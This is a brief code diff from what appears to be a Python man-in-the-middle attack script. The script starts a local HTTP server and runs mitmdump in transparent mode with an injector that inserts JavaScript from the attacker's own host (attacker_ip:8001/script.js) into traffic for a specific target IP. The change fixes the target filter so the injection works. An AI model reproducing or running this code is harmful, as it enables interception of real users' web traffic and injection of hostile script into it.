@@ -53,6 +53,6 @@ os.system("python3 httpServer.py &")
 site = "212\.91\.30\.199"
 
 # start the mitmproxy
-os.system("mitmdump --ignore '^(?!"+ +")' -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T") 
+os.system("mitmdump --ignore '^(?!"+ site +")' -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T") 
 
 
